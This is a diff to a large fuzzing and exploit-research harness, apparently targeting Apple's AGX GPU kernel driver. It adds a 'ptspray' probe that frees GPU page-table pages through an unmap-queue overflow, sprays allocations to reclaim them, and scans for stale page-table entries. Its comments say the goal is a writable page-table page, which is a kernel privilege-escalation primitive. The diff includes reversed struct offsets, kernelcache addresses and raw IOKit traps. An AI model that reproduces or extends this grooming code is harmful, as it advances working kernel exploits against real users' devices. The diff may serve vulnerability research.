@@ -23600,6 +23600,149 @@ static void p_uatrec(void) {
     LOG("[uatrec] done (alive)");
 }
 
+// V149 (p_ptspray): can the UNSCRUBBED layer be reached — freed PT/GART pages
+// of the GPU arena. This is the last open reclamation target after v147/v148
+// closed the DATA pages (§134: they live in a scrubbed GPU carveout, so both
+// the OOL sweep and the vm_deallocate variant came back clean).
+//
+// Statics re-verified against results/kc27/com_apple_AGXG16P.macho:
+//   AGXUAT::process @0x83a3654 walks the unmap slots (this+0xd8+count*0x18 =
+//   {desc,gpuva,size}), clears the leaf PTE with `str xzr`, refcounts the PT
+//   pages (this+0x10..0x38) and on 1->0 hands them back to the two inline
+//   pools in __DATA_CONST at 0x7daabd8 (pool0) / 0x7daac28 (pool1) via
+//   `bl 0x83b03a4` — free() with NO bzero/scrub of the page contents, unlike
+//   the DATA-page path.
+//   A whole-kernelcache scan finds exactly TWO references to those pool
+//   addresses and both sit in this free path (0x83a38c4 / 0x83a3924), i.e.
+//   the alloc side lives outside AGXG16P — so the pools are NOT reachable by
+//   userland allocation directly. Question this phase answers empirically:
+//   can a recycled PT page instead surface inside OUR allocations (via the
+//   raw-resource path), which would hand us a page-table page whose stale PTE
+//   content is ours to write?
+//
+// Detector is content-shaped, not marker-shaped: a live/recycled PT page
+// holds PTE entries (qwords that look like physical addresses in the top
+// bits), never our 0x41. So every reclaimer is classified as
+//   - zero (fresh/scrubbed)          -> pool unreachable from us
+//   - PTE-shaped                     -> *** PT PAGE RECYCLED INTO USER ALLOC ***
+//   - 0x41/foreign data              -> DATA-page cross (already closed in §134)
+// The scan runs BEFORE we write our marker, otherwise we would mask any
+// recycled content with it.
+static void p_ptspray(void) {
+    int rounds = atoi(getenv("FUZZ_PT_ROUNDS") ?: "3");
+    int nrecl = atoi(getenv("FUZZ_PT_NRECL") ?: "48");
+    long vsz   = strtol(getenv("FUZZ_PT_VSZ") ?: "0x10000", NULL, 0);
+    if (nrecl < 4) nrecl = 4;
+    if (nrecl > 160) nrecl = 160;
+    LOG("[ptspray] v149 PT/GART-page reclaim: %d rounds, %d reclaimers x 0x%lx",
+        rounds, nrecl, vsz);
+
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    uint8_t *devObj = *(uint8_t **)((uint8_t *)(__bridge void *)mq + 392);
+    uint8_t *dref = devObj ? *(uint8_t **)(devObj + 656) : NULL;
+    io_connect_t mconn = dref ? *(uint32_t *)(dref + 0x14) : 0;
+    if (!mconn || !dev) { LOG("[ptspray] no device/conn"); return; }
+
+    for (int round = 0; round < rounds; round++) {
+        // Victim MUST be the FIRST allocation of the round: the VA allocator
+        // is first-fit (lowest free hole wins, §7.2 IORangeAllocator), so only
+        // the lowest-slot owner is handed back by the wave that follows the
+        // mass-destroy. Allocating junk first buries the victim above the
+        // junk's low slots and the wave never revisits its range — that is
+        // what made the first ptspray runs report 0/48 reuse.
+        uint64_t gv = 0;
+        uint8_t *cv = NULL;
+        uint32_t ridV = gpu_resource2(mconn, (uint64_t)vsz, &gv, &cv);
+        if (!ridV) { LOG("[ptspray] r%d: victim alloc failed", round); continue; }
+        memset(cv, 0x5a, (size_t)vsz);
+        // junk after the victim, only to overflow the 32-entry unmap queue so
+        // AGXUAT::process actually runs (and drops the victim's PT refcounts)
+        uint32_t junk[40];
+        int njunk = 0;
+        for (int i = 0; i < 40; i++) {
+            uint64_t gj; uint8_t *pj;
+            uint32_t rj = gpu_resource2(mconn, 0x1000, &gj, &pj);
+            if (rj) junk[njunk++] = rj;
+        }
+        LOG("[ptspray] r%d: victim rid %u gpuva 0x%llx cpu %p (%ld junk ready)",
+            round, ridV, gv, cv, njunk);
+        fsync(fileno(stderr));
+        kern_return_t kd = ioconnect_trap1(mconn, 1, ridV);
+        int nd = 0;
+        for (int i = 0; i < njunk; i++) { ioconnect_trap1(mconn, 1, junk[i]); nd++; }
+        LOG("[ptspray] r%d: destroy kr 0x%08x + %d junk => AGXUAT::process "
+            "(PT pages -> pool0/pool1, unsrubbed)", round, kd, nd);
+        fsync(fileno(stderr));
+
+        // reclaim wave on the SAME raw path. Scan each allocation before we
+        // write anything into it — that is the only moment stale PT content
+        // would be visible to us.
+        uint32_t rid[nrecl];
+        uint8_t *cp[nrecl];
+        uint64_t gp[nrecl];
+        int n = 0, reuse = 0;
+        for (int i = 0; i < nrecl; i++) {
+            uint64_t g = 0; uint8_t *p = NULL;
+            uint32_t r = gpu_resource2(mconn, (uint64_t)vsz, &g, &p);
+            if (!r || !p) continue;
+            rid[n] = r; cp[n] = p; gp[n] = g; n++;
+            if (g == gv) reuse++;
+        }
+        // Positive control: if the wave does NOT pick up the victim's GPUVA,
+        // then it also has no reason to pick up its pages, and a "zero"
+        // summary below proves nothing. §132 S1 shows the reuse is
+        // deterministic (LIFO) — so reuse==0 means the experiment, not the
+        // pool segregation, is broken.
+        LOG("[ptspray] r%d control: victim gpuva 0x%llx — %d/%d reclaimers landed "
+            "on it (0 = reclaim path not exercised, result inconclusive)",
+            round, gv, reuse, n);
+        for (int i = 0; i < n && i < 8; i++) {
+            LOG("[ptspray] r%d wave[%d] rid %u gpuva 0x%llx (victim 0x%llx, %s)",
+                round, i, rid[i], gp[i], gv,
+                gp[i] == gv ? "REUSED" : (gp[i] > gv && gp[i] < gv + 0x100000 ? "near" : ""));
+        }
+        long zero = 0, pte = 0, data = 0, hitsz = 0;
+        for (int i = 0; i < n; i++) {
+            uint8_t *p = cp[i];
+            long nz = 0, n5a = 0, npte = 0, firstpte = -1;
+            for (long o = 0; o + 8 <= vsz; o += 8) {
+                uint64_t v;
+                memcpy(&v, p + o, 8);
+                if (!v) continue;
+                nz++;
+                if ((v & 0xff) == 0x5a && (v >> 8) == ((v >> 8) & ~0ULL)) { /* noop */ }
+                if (v == 0x5a5a5a5a5a5a5a5aULL) n5a++;
+                // PTE shape: physical address in the high half of a 64-bit
+                // entry, i.e. a value with a set bit far above the low 16.
+                if ((v >> 32) && (v >> 32) < 0x100000000ULL && !(v & 0xff)) {
+                    if (firstpte < 0) firstpte = o;
+                    npte++;
+                }
+            }
+            const char *cls;
+            if (npte > 0)        { cls = "PTE-SHAPED *** PT PAGE RECYCLED ***"; pte++; hitsz = vsz; }
+            else if (n5a > 0)    { cls = "victim data 0x5a (DATA cross)"; data++; }
+            else if (nz == 0)    { cls = "zero"; zero++; }
+            else                 { cls = "non-zero, non-PTE (unknown layer)"; data++; }
+            if (npte > 0 || n5a > 0) {
+                LOG("[ptspray] [HIT] r%d recl[%d] rid %u: nz %ld pte %ld (@0x%lx) "
+                    "n5a %ld first 8 bytes %016llx — %s",
+                    round, i, rid[i], nz, npte, firstpte, n5a,
+                    *(uint64_t *)p, cls);
+            }
+            // now claim the page so it cannot be recycled under us mid-scan
+            memset(p, 0x77, (size_t)vsz);
+        }
+        LOG("[ptspray] r%d summary: %d reclaimers | zero %ld | PTE-shaped %ld | "
+            "data/unknown %ld | %s",
+            round, n, zero, pte, data,
+            pte ? "*** PT-RECLAIM CONFIRMED ***" : "(no PT content reachable)");
+        fsync(fileno(stderr));
+    }
+    LOG("[ptspray] done (alive)");
+}
+
 // V109: IOCoreSurfaceRoot (type 0, IOSurfaceRootUserClient, 60 sels).
 // Basis: sel13 init, sel6 create_fast_path, sel2 lock, sel3 unlock, sel1 release.
 // Fuzz: sel7 client_mem (addr/size extremes), sel6 dims, sel27 bulk_attachments,
@@ -25403,6 +25546,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_SHMEMLEAK")) { p_shmemleak(); LOG("[probe13] shmemleak-only mode, stop"); return NULL; }
         if (getenv("FUZZ_UAT")) { p_uat(); LOG("[probe13] uat-only mode, stop"); return NULL; }
         if (getenv("FUZZ_UATREC")) { p_uatrec(); LOG("[probe13] uatrec-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_PTSPRAY")) { p_ptspray(); LOG("[probe13] ptspray-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM")) { p_reclaim(); LOG("[probe13] reclaim-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GPUUAF")) { p_gpuuaf(); LOG("[probe13] gpuuaf-only mode, stop"); return NULL; }
